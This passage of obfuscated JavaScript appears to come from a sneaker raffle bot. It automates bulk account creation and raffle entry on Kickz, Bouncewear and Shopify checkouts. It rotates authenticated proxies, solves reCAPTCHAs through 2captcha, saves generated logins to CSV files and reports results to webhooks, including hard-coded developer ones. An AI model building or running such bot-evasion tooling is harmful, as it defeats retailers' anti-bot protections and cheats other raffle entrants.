            await _0x491ae3(0x320), await _0x3446d6['select']('#checkout_shipping_address_country', '' + _0x56fc89[_0x51c551]['Country']), await _0x3446d6['waitForTimeout'](0x258), await _0x3446d6['type']('#checkout_shipping_address_first_name', '' + _0x56fc89[_0x51c551]['FirstName']), await _0x3446d6['waitForTimeout'](0x320), await _0x3446d6['type']('#checkout_shipping_address_last_name', '' + _0x56fc89[_0x51c551]['LastName']), await _0x3446d6['waitForTimeout'](0x2bc), await _0x3446d6['type']('#checkout_shipping_address_address1', _0x56fc89[_0x51c551]['Address1'] + '\x20' + _0x56fc89[_0x51c551]['HouseNumber']), await _0x3446d6['waitForTimeout'](0x2bc), await _0x3446d6['type']('#checkout_shipping_address_address2', '' + _0x56fc89[_0x51c551]['Address2']), await _0x3446d6['waitForTimeout'](0x2bc);
            _0x56fc89[_0x51c551]['Postcode'] == undefined ? await _0x3446d6['type']('#checkout_shipping_address_zip', '' + _0x56fc89[_0x51c551]['Zip']) : await _0x3446d6['type']('#checkout_shipping_address_zip', '' + _0x56fc89[_0x51c551]['Postcode']);
            await _0x3446d6['waitForTimeout'](0x2bc), await _0x3446d6['type']('#checkout_shipping_address_city', '' + _0x56fc89[_0x51c551]['City']), await _0x3446d6['waitForTimeout'](0x2bc), console['log'](_0x1e4ea5() + '\x20[' + _0x1b393f['name'] + ']\x20Task\x20' + (_0x51c551 + 0x1) + '\x20:\x20Getting\x20Shipping'), await _0x3446d6, _0x3446d6['evaluate'](() => {
                const _0x2c3d29 = document['querySelector']('#continue_button');
                for (var _0x40dc44 = 0x0; _0x40dc44 < 0x5; _0x40dc44++) {
                    if (_0x2c3d29) {
                        _0x2c3d29['click'](), _0x2c3d29['click']();
                        break;
                    } else
                        _0x491ae3(0xfa0);
                }
            }), await _0x3446d6['waitForTimeout'](0x1194);
            try {
                await _0x3446d6['waitForSelector']('div.radio-wrapper', { 'timeout': 0x186a0 });
            } catch {
                console['log'](_0x1818b9['red'](_0x1e4ea5() + '\x20[' + _0x1b393f['name'] + ']\x20Task\x20' + (_0x51c551 + 0x1) + '\x20:\x20Proxy\x20Error'));
                continue;
            }
            _0x3446d6['evaluate'](() => {
                const _0x284dc6 = document['querySelector']('#continue_button');
                for (var _0x3a3be7 = 0x0; _0x3a3be7 < 0x5; _0x3a3be7++) {
                    if (_0x284dc6) {
                        _0x284dc6['click']();
                        break;
                    } else
                        _0x491ae3(0xfa0);
                }
            }), await _0x3446d6['waitForTimeout'](0x7d0), console['log'](_0x1e4ea5() + '\x20[' + _0x1b393f['name'] + ']\x20Task\x20' + (_0x51c551 + 0x1) + '\x20:\x20Finishing\x20Entry'), await _0x3446d6['waitForSelector']('#continue_button', { 'timeout': 0x186a0 }), _0x3446d6['evaluate'](() => {
                const _0x4e7383 = document['querySelector']('#continue_button');
                for (var _0x27b07d = 0x0; _0x27b07d < 0x5; _0x27b07d++) {
                    if (_0x4e7383) {
                        _0x4e7383['click']();
                        break;
                    } else
                        _0x491ae3(0xfa0);
                }
            }), await _0x3446d6['waitForTimeout'](0x1194), await _0x3446d6['waitForSelector']('#continue_button'), _0x3446d6['evaluate'](() => {
                const _0xe315b9 = document['querySelector']('#continue_button');
                for (var _0x4a1527 = 0x0; _0x4a1527 < 0x5; _0x4a1527++) {
                    if (_0xe315b9) {
                        _0xe315b9['click']();
                        break;
                    } else
                        _0x491ae3(0xfa0);
                }
            });
            try {
                await _0x3446d6['waitForSelector']('div[data-step=\x22thank_you\x22]'), console['log'](_0x1818b9['green'](_0x1e4ea5() + '\x20[' + _0x1b393f['name'] + ']\x20Task\x20' + (_0x51c551 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                if (_0x401d1c['webhook'] != undefined && _0x401d1c['webhook'] != '')
                    try {
                        await _0xafb19d(_0x401d1c['webhook'], _0x3c4d2f['succesDEVMSG']);
                    } catch {
                    }
                await _0x491ae3(0xc8), await _0xafb19d(_0xc8def8, _0x3c4d2f['succesDEVMSG']), await _0x491ae3(0xc8);
                try {
                    await _0xafb19d(_0x45ab34, _0x3c4d2f['succesPUBMSG']);
                } catch {
                }
            } catch (_0x16618e) {
                console['log'](_0x1818b9['red'](_0x1e4ea5() + '\x20[' + _0x1b393f['name'] + ']\x20Task\x20' + (_0x51c551 + 0x1) + '\x20:\x20Entry\x20Failed:\x20' + _0x16618e));
            }
        } catch (_0xd8c5f7) {
            console['log'](_0x1818b9['red'](_0x1e4ea5() + '\x20[' + _0x1b393f['name'] + ']\x20Task\x20' + (_0x51c551 + 0x1) + '\x20:\x20' + _0xd8c5f7)), _0x46f573 = '' + _0xd8c5f7;
            var _0x17acf8 = await _0x344cc9(_0x56fc89[_0x51c551], _0x1b393f, 'dev', !![], _0x46f573);
            _0x3c4d2f['errorDEV'] = { 'embeds': [_0x17acf8] }, _0x401d1c['webhook'] != undefined && _0x401d1c['webhook'] != '' && await _0xafb19d(_0x401d1c['webhook'], _0x3c4d2f['errorDEV']), await _0xafb19d(_0x51c252, _0x3c4d2f['errorDEV']), _0x495723 = 'yes';
        } finally {
            _0x257758 && _0x257758['close']();
            if (_0x495723 == 'yes' && _0x4f8413 != 0x5 && _0x46f573 != 'Size\x20Not\x20Found') {
                console['log'](_0x1818b9['red'](_0x1e4ea5() + '\x20[' + _0x1b393f['name'] + ']\x20Task\x20' + (_0x51c551 + 0x1) + '\x20:\x20Retrying')), _0x51c551 = _0x51c551 - 0x1, _0x4f8413 = _0x4f8413 + 0x1;
                continue;
            }
            if (_0x51c551 + 0x1 == _0x56fc89['length']) {
                console['log'](_0x1818b9['green']('Finished\x20tasks,\x20returning\x20to\x20Main\x20Menu')), await _0x491ae3(0x7d0);
                break;
            }
            console['log']('Waiting\x20for\x20' + _0x401d1c['AfewDelay'] + '\x20ms'), await _0x491ae3(_0x401d1c['AfewDelay']);
        }
    }
};
async function _0x5b6e3c(_0x29dcc3, _0x1577fc, _0x4d054d, _0x2366c3) {
    _0x4efd86['use'](_0x202680()), _0x4efd86['use'](_0x1fedc1({
        'provider': {
            'id': '2captcha',
            'token': '' + _0x401d1c['captchaKey']
        },
        'visualFeedback': !![]
    }));
    for (var _0x5c8b41 = 0x0; _0x5c8b41 < _0x4d054d['length']; _0x5c8b41++) {
        var _0x3224c8 = '', _0x1bc18d = 0x0;
        _0x57f604(_0x1577fc['name'] + '\x20Task\x20' + (_0x5c8b41 + 0x1) + '\x20/\x20' + _0x4d054d['length'] + '\x20||\x20File:\x20' + _0xb37a88 + '\x20Proxies:\x20' + _0x39f01a), await _0x238b3c(_0x4d054d, _0x5c8b41);
        var _0x12640f = [{
            'type': 'rich',
            'title': 'Succesful\x20Kickz\x20Account\x20Generated',
            'description': '',
            'color': 0xc0d6d6,
            'fields': [
                {
                    'name': 'User',
                    'value': '' + _0x54444c
                },
                {
                    'name': 'Delay',
                    'value': '' + _0x401d1c['delay']
                },
                {
                    'name': 'Version',
                    'value': '' + _0x431e19
                }
            ]
        }];
        const _0x57d781 = { 'embeds': _0x12640f };
        var _0x346d02 = await _0x344cc9(_0x4d054d[_0x5c8b41], _0x1577fc, 'acc', ![]);
        const _0x27bcfe = { 'succesDEVMSG': { 'embeds': [_0x346d02] } };
        if (_0x4d054d[_0x5c8b41]['Email'] == '' || _0x4d054d[_0x5c8b41]['FirstName'] == '' || _0x4d054d[_0x5c8b41]['LastName'] == '') {
            console['log'](_0x1e4ea5() + '\x20[' + _0x1577fc['name'] + ']\x20Task\x20' + (_0x5c8b41 + 0x1) + '\x20:\x20Invalid\x20CSV');
            continue;
        }
        _0x4d054d[_0x5c8b41]['Password'] == '' && (_0x4d054d[_0x5c8b41]['Password'] = 'JRaffles23!');
        if (_0x401d1c['useRandomProxy'] = ![])
            var _0x4ce9f6 = _0x2366c3[_0x5c8b41]['split'](':');
        else
            var _0x3a2e14 = Math['round'](Math['random']() * (_0x2366c3['length'] - 0x1)), _0x4ce9f6 = _0x2366c3[_0x3a2e14]['split'](':');
        const _0x1419b4 = await _0x4efd86['launch']({
            'headless': !![],
            'args': [
                '--proxy-server=' + _0x4ce9f6[0x0] + ':' + _0x4ce9f6[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
        try {
            const _0x1a35e6 = await _0x1419b4['newPage']();
            await _0x1a35e6['authenticate']({
                'username': '' + _0x4ce9f6[0x2],
                'password': '' + _0x4ce9f6[0x3]
            }), console['log'](_0x1e4ea5() + '\x20[' + _0x1577fc['name'] + ']\x20Task\x20' + (_0x5c8b41 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x1a35e6['setRequestInterception'](!![]), _0x1a35e6['on']('request', _0x526a27 => {
                _0x526a27['resourceType']() === 'image' || _0x526a27['resourceType']() === 'font' || _0x526a27['resourceType']() === 'media' ? _0x526a27['abort']() : _0x526a27['continue']();
            }), await _0x1a35e6['goto'](_0x29dcc3), await _0x491ae3(0xbb8), console['log'](_0x1e4ea5() + '\x20[' + _0x1577fc['name'] + ']\x20Task\x20' + (_0x5c8b41 + 0x1) + '\x20:\x20Starting\x20Registration'), await _0x1a35e6['waitForSelector']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x1a35e6['click']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x1a35e6['waitForSelector']('#button-register'), await _0x491ae3(0x7d0), await _0x1a35e6['evaluate'](() => {
                const _0x2aee08 = document['querySelector']('#button-register');
                _0x2aee08['click']();
            }), console['log'](_0x1e4ea5() + '\x20[' + _0x1577fc['name'] + ']\x20Task\x20' + (_0x5c8b41 + 0x1) + '\x20:\x20Setting\x20Credentials'), await _0x491ae3(0x1388), await _0x1a35e6['waitForSelector']('#customer_salutation'), await _0x1a35e6['select']('#customer_salutation', 'mr'), await _0x491ae3(0x7d0), await _0x1a35e6['waitForSelector']('#customer_firstname'), await _0x1a35e6['type']('#customer_firstname', '' + _0x4d054d[_0x5c8b41]['FirstName']), await _0x491ae3(0x352), await _0x1a35e6['waitForSelector']('#customer_lastname'), await _0x1a35e6['type']('#customer_lastname', '' + _0x4d054d[_0x5c8b41]['LastName']), await _0x491ae3(0x352), await _0x1a35e6['type']('#email-input', '' + _0x4d054d[_0x5c8b41]['Email']), await _0x491ae3(0x352), await _0x1a35e6['type']('#email-confirm-input', '' + _0x4d054d[_0x5c8b41]['Email']), await _0x491ae3(0x352), await _0x1a35e6['type']('#register-password', '' + _0x4d054d[_0x5c8b41]['Password']), await _0x491ae3(0x352), await _0x1a35e6['type']('#password-confirm', '' + _0x4d054d[_0x5c8b41]['Password']), await _0x491ae3(0x352), console['log'](_0x1e4ea5() + '\x20[' + _0x1577fc['name'] + ']\x20Task\x20' + (_0x5c8b41 + 0x1) + '\x20:\x20Sending\x20Credentials'), await _0x1a35e6['click']('#consent'), await _0x491ae3(0x1f4);
            const _0x1f3311 = await _0x1a35e6['$']('div.inputErrorMsg.b-form_section-message');
            if (_0x1f3311) {
                console['log'](_0x1818b9['red'](_0x1e4ea5() + '\x20[' + _0x1577fc['name'] + ']\x20Task\x20' + (_0x5c8b41 + 0x1) + '\x20:\x20Your\x20password\x20must\x20contain\x20at\x20least\x20one\x20uppercase\x20&\x20one\x20lowercase\x20letter,\x20one\x20number\x20and\x20one\x20special\x20character.'));
                continue;
            }
            await _0x1a35e6['click']('#buttonRegister');
            try {
                await _0x1a35e6['waitForSelector']('#verificationCode');
            } catch {
                throw new Error('Account\x20already\x20registered');
            }
            console['log'](_0x1818b9['yellow'](_0x1e4ea5() + '\x20[' + _0x1577fc['name'] + ']\x20Task\x20' + (_0x5c8b41 + 0x1) + '\x20:\x20Account\x20' + _0x4d054d[_0x5c8b41]['Email'] + '\x20Generated!')), console['log'](_0x1818b9['yellow'](_0x1e4ea5() + '\x20[' + _0x1577fc['name'] + ']\x20Task\x20' + (_0x5c8b41 + 0x1) + '\x20:\x20A\x20verification\x20code\x20has\x20been\x20sent\x20to\x20' + _0x4d054d[_0x5c8b41]['Email'])), await _0x491ae3(0x4b0);
            async function _0xcbdf10() {
                console['log'](_0x1818b9['yellow'](_0x1e4ea5() + '\x20[' + _0x1577fc['name'] + ']\x20Task\x20' + (_0x5c8b41 + 0x1) + '\x20:\x20Paste\x20your\x20verification\x20code\x20here:'));
                var _0x364835 = await _0x8f638f['get']('Code');
                return _0x364835['Code'];
            }
            ;
            code = await _0xcbdf10(), _0x491ae3(0x320), console['log'](_0x1e4ea5() + '\x20[' + _0x1577fc['name'] + ']\x20Task\x20' + (_0x5c8b41 + 0x1) + '\x20:\x20Verifying..'), await _0x1a35e6['type']('#verificationCode', code), await _0x491ae3(0x1f4), await _0x1a35e6['click']('#buttonVerify'), await _0x491ae3(0x190), await _0x1a35e6['click']('#buttonVerify'), await _0x491ae3(0x3e8);
            try {
                await _0x1a35e6['waitForSelector']('div.b-user_greeting'), console['log'](_0x1818b9['green'](_0x1e4ea5() + '\x20[' + _0x1577fc['name'] + ']\x20Task\x20' + (_0x5c8b41 + 0x1) + '\x20:\x20Account\x20' + _0x4d054d[_0x5c8b41]['Email'] + '\x20Generated\x20&\x20Verified!')), _0x550d6b['appendFileSync']('../accounts/kickz-verified.csv', '\x0a' + _0x4d054d[_0x5c8b41]['Email'] + ',' + _0x4d054d[_0x5c8b41]['Password'] + ','), console['log'](_0x1e4ea5() + '\x20[' + _0x1577fc['name'] + ']\x20Task\x20' + (_0x5c8b41 + 0x1) + '\x20:\x20Account\x20' + _0x4d054d[_0x5c8b41]['Email'] + '\x20Saved\x20in\x20\x27accounts/kickz-verified.csv\x27');
                try {
                    _0x401d1c['webhook'] != undefined && _0x401d1c['webhook'] != '' && await _0xafb19d(_0x401d1c['webhook'], _0x27bcfe['succesDEVMSG']);
                } catch {
                }
                await _0xafb19d(_0x3cac51, _0x27bcfe['succesDEVMSG']);
            } catch {
                console['log'](_0x1818b9['red'](_0x1e4ea5() + '\x20[' + _0x1577fc['name'] + ']\x20Task\x20' + (_0x5c8b41 + 0x1) + '\x20:\x20Verification\x20failed')), console['log'](_0x1818b9['red'](_0x1e4ea5() + '\x20[' + _0x1577fc['name'] + ']\x20Task\x20' + (_0x5c8b41 + 0x1) + '\x20:\x20Account\x20saved\x20in\x20\x27accounts/kickz-unverified.csv\x27'));
            }
        } catch (_0x37e0e4) {
            console['log'](_0x1818b9['red'](_0x1e4ea5() + '\x20[' + _0x1577fc['name'] + ']\x20Task\x20' + (_0x5c8b41 + 0x1) + '\x20:\x20' + _0x37e0e4)), _0x12640f[0x0]['title'] = 'Failed\x20kickz\x20Acc\x20Gen', _0x12640f[0x0]['description'] = '' + _0x37e0e4, await _0xafb19d(_0x51c252, _0x57d781), _0x3224c8 = 'yes';
        } finally {
            _0x1419b4 && _0x1419b4['close']();
            if (_0x3224c8 == 'yes' && _0x1bc18d != 0x5) {
                console['log'](_0x1818b9['red'](_0x1e4ea5() + '\x20[' + _0x1577fc['name'] + ']\x20Task\x20' + (_0x5c8b41 + 0x1) + '\x20:\x20Retrying')), _0x5c8b41 = _0x5c8b41 - 0x1, _0x1bc18d = _0x1bc18d + 0x1;
                continue;
            }
            console['log']('Waiting\x20for\x20' + _0x401d1c['delay'] + '\x20ms'), await _0x491ae3(_0x401d1c['delay']);
        }
    }
}
async function _0x36008b(_0xb9719d, _0x1398d4, _0x20de7c) {
    _0x4efd86['use'](_0x202680()), _0x4efd86['use'](_0x1fedc1({
        'provider': {
            'id': '2captcha',
            'token': '' + _0x401d1c['captchaKey']
        },
        'visualFeedback': !![]
    }));
    for (var _0x14cbec = 0x0; _0x14cbec < _0x1398d4['length']; _0x14cbec++) {
        var _0x227942, _0x3e517c = '', _0x5da9bf = 0x0;
        _0x57f604(_0xb9719d['name'] + '\x20Task\x20' + (_0x14cbec + 0x1) + '\x20/\x20' + _0x1398d4['length'] + '\x20||\x20File:\x20' + _0xb37a88 + '\x20Proxies:\x20' + _0x39f01a);
        var _0x1a6f48 = [{
            'type': 'rich',
            'title': 'Succesful\x20Kickz\x20Entry',
            'description': '',
            'color': 0xc0d6d6,
            'fields': [
                {
                    'name': 'User',
                    'value': '' + _0x54444c
                },
                {
                    'name': 'Product',
                    'value': '' + _0x1398d4[_0x14cbec]['Url']
                },
                {
                    'name': 'Size',
                    'value': '' + _0x1398d4[_0x14cbec]['Size']
                },
                {
                    'name': 'Delay',
                    'value': '' + _0x401d1c['delay']
                },
                {
                    'name': 'Version',
                    'value': '' + _0x431e19
                }
            ]
        }], _0x484790 = await _0x344cc9(_0x1398d4[_0x14cbec], _0xb9719d, 'dev', ![]), _0x22fa9f = await _0x344cc9(_0x1398d4[_0x14cbec], _0xb9719d, 'pub', ![]);
        const _0x32034a = {
            'succesDEVMSG': { 'embeds': [_0x484790] },
            'succesPUBMSG': { 'embeds': [_0x22fa9f] }
        };
        await _0x238b3c(_0x1398d4, _0x14cbec);
        if (_0x1398d4[_0x14cbec]['Email'] == '' || _0x1398d4[_0x14cbec]['Password'] == '' || _0x1398d4[_0x14cbec]['FirstName'] == '' || _0x1398d4[_0x14cbec]['LastName'] == '') {
            console['log'](_0x1e4ea5() + '\x20[' + _0xb9719d['name'] + ']\x20Task\x20' + (_0x14cbec + 0x1) + '\x20:\x20Invalid\x20CSV');
            continue;
        }
        if (_0x401d1c['useRandomProxy'] = ![])
            var _0x5680ce = _0x20de7c[_0x14cbec]['split'](':');
        else
            var _0x23ac0f = Math['round'](Math['random']() * (_0x20de7c['length'] - 0x1)), _0x5680ce = _0x20de7c[_0x23ac0f]['split'](':');
        const _0x41ed10 = await _0x4efd86['launch']({
            'headless': ![],
            'args': [
                '--proxy-server=' + _0x5680ce[0x0] + ':' + _0x5680ce[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
        try {
            const _0x4f35f3 = await _0x41ed10['newPage']();
            await _0x4f35f3['authenticate']({
                'username': '' + _0x5680ce[0x2],
                'password': '' + _0x5680ce[0x3]
            }), console['log'](_0x1e4ea5() + '\x20[' + _0xb9719d['name'] + ']\x20Task\x20' + (_0x14cbec + 0x1) + '\x20:\x20Getting\x20Session'), await _0x4f35f3['setRequestInterception'](!![]), _0x4f35f3['on']('request', _0x120f9d => {
                _0x120f9d['resourceType']() === 'image' || _0x120f9d['resourceType']() === 'font' || _0x120f9d['resourceType']() === 'media' ? _0x120f9d['abort']() : _0x120f9d['continue']();
            }), await _0x4f35f3['goto']('' + _0x1398d4[_0x14cbec]['Url'], { 'waitUntil': 'networkidle2' }), await _0x491ae3(0x12c);
            try {
                await _0x4f35f3['click']('a[title=\x22Sign\x20In\x22]');
            } catch {
                await _0x4f35f3['click']('a[title=\x22sign\x20in\x22]');
            }
            console['log'](_0x1e4ea5() + '\x20[' + _0xb9719d['name'] + ']\x20Task\x20' + (_0x14cbec + 0x1) + '\x20:\x20Logging\x20in'), await _0x4f35f3['waitForSelector']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x4f35f3['click']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x4f35f3['waitForSelector']('#username'), await _0x4f35f3['type']('#username', _0x1398d4[_0x14cbec]['Email']), await _0x4f35f3['waitForSelector']('#password'), await _0x4f35f3['type']('#password', _0x1398d4[_0x14cbec]['Password']), await _0x491ae3(0x190), await _0x4f35f3['click']('#buttonSubmit'), await _0x4f35f3['waitForSelector']('div.b-user_greeting'), console['log'](_0x1e4ea5() + '\x20[' + _0xb9719d['name'] + ']\x20Task\x20' + (_0x14cbec + 0x1) + '\x20:\x20Getting\x20Product'), await _0x491ae3(0x1f4), await _0x4f35f3['goto']('' + _0x1398d4[_0x14cbec]['Url'], { 'waitUntil': 'networkidle2' }), console['log'](_0x1e4ea5() + '\x20[' + _0xb9719d['name'] + ']\x20Task\x20' + (_0x14cbec + 0x1) + '\x20:\x20Choosing\x20size\x20' + _0x1398d4[_0x14cbec]['Size']);
            let _0x2a167e = _0x1398d4[_0x14cbec]['Size']['replace']('.5', '\x201/2');
            await _0x4f35f3['click']('button[title=\x22' + _0x2a167e + '\x22]'), await _0x491ae3(0x1f4);
            try {
                await _0x4f35f3['click']('button[data-tau=\x22add_new_address\x22]');
            } catch {
            }
            await _0x491ae3(0x12c), console['log'](_0x1e4ea5() + '\x20[' + _0xb9719d['name'] + ']\x20Task\x20' + (_0x14cbec + 0x1) + '\x20:\x20Filling\x20Information'), await _0x4f35f3['select']('#dwfrm_raffle_addressFields_salutation', 'mr'), await _0x491ae3(0x12c), await _0x4f35f3['type']('#dwfrm_raffle_addressFields_firstName', _0x1398d4[_0x14cbec]['FirstName']), await _0x491ae3(0x12c), await _0x4f35f3['type']('#dwfrm_raffle_addressFields_lastName', _0x1398d4[_0x14cbec]['LastName']), await _0x491ae3(0x12c), await _0x4f35f3['select']('#dwfrm_raffle_addressFields_country', _0x1398d4[_0x14cbec]['Country']), await _0x491ae3(0x12c), await _0x4f35f3['type']('#dwfrm_raffle_addressFields_city', _0x1398d4[_0x14cbec]['City']), await _0x491ae3(0x12c);
            _0x1398d4[_0x14cbec]['Postcode'] == undefined && (_0x1398d4[_0x14cbec]['Postcode'] = _0x1398d4[_0x14cbec]['Zip']);
            await _0x4f35f3['type']('#dwfrm_raffle_addressFields_postalCode', _0x1398d4[_0x14cbec]['Postcode']), await _0x491ae3(0x12c), await _0x4f35f3['type']('#dwfrm_raffle_addressFields_address1', _0x1398d4[_0x14cbec]['Address1']), await _0x491ae3(0x12c), await _0x4f35f3['type']('#dwfrm_raffle_addressFields_address2', _0x1398d4[_0x14cbec]['HouseNumber']), await _0x491ae3(0x12c), await _0x4f35f3['type']('#dwfrm_raffle_addressFields_additionalAddressInfo', _0x1398d4[_0x14cbec]['Address2']), await _0x491ae3(0x12c), await _0x4f35f3['click']('#dwfrm_raffle_addressFields_saveAddress'), await _0x491ae3(0x12c), await _0x4f35f3['type']('#dwfrm_raffle_raffleSpecificFields_instagramAccount', _0x1398d4[_0x14cbec]['Follower']), await _0x491ae3(0x1f4), await _0x4f35f3['click']('#dwfrm_raffle_raffleSpecificFields_consentOnConditions'), await _0x491ae3(0x1f4), console['log'](_0x1e4ea5() + '\x20[' + _0xb9719d['name'] + ']\x20Task\x20' + (_0x14cbec + 0x1) + '\x20:\x20' + _0x1818b9['blue']('Awaiting\x20Paypal\x20Payment')), await _0x4f35f3['click']('.b-paypal_button');
            try {
                await _0x4f35f3['waitForSelector']('.b-raffle-message.m-success', { 'timeout': 0x493e0 }), console['log'](_0x1818b9['green'](_0x1e4ea5() + '\x20[' + _0xb9719d['name'] + ']\x20Task\x20' + (_0x14cbec + 0x1) + '\x20:\x20Raffle\x20Entered!')), _0x401d1c['webhook'] != undefined && _0x401d1c['webhook'] != '' && await _0xafb19d(_0x401d1c['webhook'], _0x32034a['succesDEVMSG']), await _0x491ae3(0xc8), await _0xafb19d(_0xc8def8, _0x32034a['succesDEVMSG']), await _0x491ae3(0xc8), await _0xafb19d(_0x45ab34, _0x32034a['succesPUBMSG']);
            } catch (_0x45d934) {
                console['log'](_0x1818b9['red'](_0x1e4ea5() + '\x20[' + _0xb9719d['name'] + ']\x20Task\x20' + (_0x14cbec + 0x1) + '\x20:\x20Paypal\x20Error:\x20' + _0x45d934)), _0x227942 = 'Error\x20while\x20entering\x20Paypal:\x20' + _0x45d934;
                var _0x1316d4 = await _0x344cc9(_0x1398d4[_0x14cbec], _0xb9719d, 'dev', !![], _0x227942);
                _0x32034a['errorDEV'] = { 'embeds': [_0x1316d4] }, _0x401d1c['webhook'] != undefined && _0x401d1c['webhook'] != '' && await _0xafb19d(_0x401d1c['webhook'], _0x32034a['errorDEV']), await _0xafb19d(_0x51c252, _0x32034a['errorDEV']);
            }
        } catch (_0x503ba5) {
            console['log'](_0x1818b9['red'](_0x1e4ea5() + '\x20[' + _0xb9719d['name'] + ']\x20Task\x20' + (_0x14cbec + 0x1) + '\x20:\x20' + _0x503ba5)), _0x227942 = '' + _0x503ba5;
            var _0x1316d4 = await _0x344cc9(_0x1398d4[_0x14cbec], _0xb9719d, 'dev', !![], _0x227942);
            _0x32034a['errorDEV'] = { 'embeds': [_0x1316d4] }, _0x401d1c['webhook'] != undefined && _0x401d1c['webhook'] != '' && await _0xafb19d(_0x401d1c['webhook'], _0x32034a['errorDEV']), await _0xafb19d(_0x51c252, _0x32034a['errorDEV']), _0x3e517c = 'yes';
        } finally {
            _0x41ed10 && _0x41ed10['close']();
            if (_0x3e517c == 'yes' && _0x5da9bf != 0x5) {
                console['log'](_0x1818b9['red'](_0x1e4ea5() + '\x20[' + _0xb9719d['name'] + ']\x20Task\x20' + (_0x14cbec + 0x1) + '\x20:\x20Retrying')), _0x14cbec = _0x14cbec - 0x1, _0x5da9bf = _0x5da9bf + 0x1;
                continue;
            }
            console['log']('Waiting\x20for\x20' + _0x401d1c['AfewDelay'] + '\x20ms'), await _0x491ae3(_0x401d1c['AfewDelay']);
        }
    }
}
async function _0x54f966(_0x1d44fa, _0xa96462) {
    _0x4efd86['use'](_0x202680()), _0x4efd86['use'](_0x1fedc1({
        'provider': {
            'id': '2captcha',
            'token': '' + _0x401d1c['captchaKey']
        },
        'visualFeedback': !![]
    }));
    for (var _0x616518 = 0x0; _0x616518 < bouncewear['length']; _0x616518++) {
        await _0x238b3c(bouncewear, _0x616518);
        if (bouncewear[_0x616518]['Email'] == '' || bouncewear[_0x616518]['Password'] == '' || bouncewear[_0x616518]['FirstName'] == '' || bouncewear[_0x616518]['LastName'] == '') {
            console['log'](_0x1e4ea5() + '\x20[' + _0x461b58[taskModule]['name'] + ']\x20Task\x20' + (_0x616518 + 0x1) + '\x20:\x20Invalid\x20CSV');
            continue;
        }
        if (_0x401d1c['useRandomProxy'] = ![])
            var _0x353db9 = _0x536d43()[_0x616518]['split'](':');
        else
            var _0x4a4973 = Math['round'](Math['random']() * (_0x536d43()['length'] - 0x1)), _0x353db9 = _0x536d43()[_0x4a4973]['split'](':');
        const _0xb42d32 = await _0x4efd86['launch']({
            'headless': !![],
            'args': [
                '--proxy-server=' + _0x353db9[0x0] + ':' + _0x353db9[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
        try {
            const _0x4b5b2b = await _0xb42d32['newPage']();
            await _0x4b5b2b['authenticate']({
                'username': '' + _0x353db9[0x2],
                'password': '' + _0x353db9[0x3]
            }), console['log'](_0x1e4ea5() + '\x20[' + _0xa96462['name'] + ']\x20Task\x20' + (_0x616518 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x4b5b2b['setRequestInterception'](!![]), _0x4b5b2b['on']('request', _0x384fcc => {
                _0x384fcc['resourceType']() === 'image' || _0x384fcc['resourceType']() === 'font' || _0x384fcc['resourceType']() === 'media' ? _0x384fcc['abort']() : _0x384fcc['continue']();
            }), await _0x4b5b2b['goto'](_0x1d44fa), await _0x491ae3(0xbb8), await _0x4b5b2b['waitForSelector']('#RegisterForm-FirstName'), console['log'](_0x1e4ea5() + '\x20[' + _0xa96462['name'] + ']\x20Task\x20' + (_0x616518 + 0x1) + '\x20:\x20Filling\x20information'), await _0x4b5b2b['type']('#RegisterForm-FirstName', '' + bouncewear[_0x616518]['FirstName']), await _0x491ae3(0x226), await _0x4b5b2b['type']('#RegisterForm-LastName', '' + bouncewear[_0x616518]['LastName']), await _0x491ae3(0x226), await _0x4b5b2b['type']('#RegisterForm-email', '' + bouncewear[_0x616518]['Email']), await _0x491ae3(0x226), await _0x4b5b2b['type']('#RegisterForm-password', '' + bouncewear[_0x616518]['Password']), await _0x491ae3(0x226), await _0x4b5b2b['click']('#marketing'), console['log'](_0x1e4ea5() + '\x20[' + _0xa96462['name'] + ']\x20Task\x20' + (_0x616518 + 0x1) + '\x20:\x20Submitting..'), await _0x4b5b2b['$eval']('#RegisterForm', _0x4c89c9 => _0x4c89c9['submit']()), await _0x491ae3(0x1f40), console['log'](_0x1e4ea5() + '\x20[' + _0xa96462['name'] + ']\x20Task\x20' + (_0x616518 + 0x1) + '\x20:\x20Solving\x20Captcha'), await _0x4b5b2b['solveRecaptchas'](), await _0x4b5b2b['click']('.shopify-challenge__button.btn');
            async function _0x752a9() {
                for (var _0x1c8a2f = 0x0; _0x1c8a2f < 0x4; _0x1c8a2f++) {
                    try {
                        console['log']('try'), await _0x4b5b2b['waitForSelector']('.shopify-challenge__error', { 'timeout': 0x1388 }), console['log'](_0x1e4ea5() + '\x20[' + _0xa96462['name'] + ']\x20Task\x20' + (_0x616518 + 0x1) + '\x20:\x20' + _0x1818b9['red']('Catpcha\x20failed,\x20retrying..')), await _0x4b5b2b['solveRecaptchas'](), await _0x4b5b2b['click']('.shopify-challenge__button.btn');
                    } catch {
                        console['log']('catch');
                        break;
                    }
                }
            }
            await _0x752a9(), console['log'](_0x1e4ea5() + '\x20[' + _0xa96462['name'] + ']\x20Task\x20' + (_0x616518 + 0x1) + '\x20:\x20Captcha\x20Solved'), await _0x491ae3(0x1f4);
            try {
                await _0x4b5b2b['waitForSelector']('.featured-title'), await _0x491ae3(0x1f4), console['log'](_0x1818b9['green'](_0x1e4ea5() + '\x20[' + _0xa96462['name'] + ']\x20Task\x20' + (_0x616518 + 0x1) + '\x20:\x20Account\x20' + bouncewear[_0x616518]['Email'] + '\x20Generated!')), _0x550d6b['appendFileSync']('../accounts/bouncewear.csv', '\x0a' + bouncewear[_0x616518]['Email'] + ',' + bouncewear[_0x616518]['Password']), console['log'](_0x1818b9['yellow'](_0x1e4ea5() + '\x20[' + _0xa96462['name'] + ']\x20Task\x20' + (_0x616518 + 0x1) + '\x20:\x20Account\x20' + bouncewear[_0x616518]['Email'] + '\x20Saved\x20in\x20\x27accounts/bouncewear.csv\x27'));
            } catch (_0x3d6c2a) {
